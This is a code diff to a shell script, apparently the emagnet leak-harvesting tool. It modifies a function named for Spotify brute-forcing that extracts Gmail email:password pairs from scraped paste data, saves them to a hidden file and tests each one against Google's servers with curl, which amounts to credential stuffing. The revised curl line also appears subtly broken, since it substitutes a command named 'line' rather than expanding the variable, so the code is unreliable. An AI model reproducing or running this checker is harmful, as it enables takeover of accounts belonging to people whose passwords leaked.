@@ -672,11 +672,16 @@ emagnet_spotify_bruter() {
                     grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" \
                         |awk '{print $1}' \
                         |cut -d: -f2,3 \
-                        |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v '/'|grep -i 'gmail.com' \
+                        |uniq \
+                        |grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'\
+                        |grep -v '/' \
+                        |grep -i 'gmail.com' \
                         >> $HOME/.config/emagnet/tmp/.emagnet-passwords.txt
 
                 while read -r line; do
-                    GMAIL_ATTACK=$(curl -s -u $line https://mail.google.com/mail/feed/atom|grep -o "xml")
+                    GMAIL_ATTACK=$(curl -sL -u $(line)  smtps://smtp.gmail.com:465/ -v 2>&1 \
+                                    |grep -qo "Application-specific";)
+
                     GMAIL_USER="$(echo $line | cut -d: -f1)"
                     GMAIL_PASS="$(echo $line | cut -d: -f2)"
 
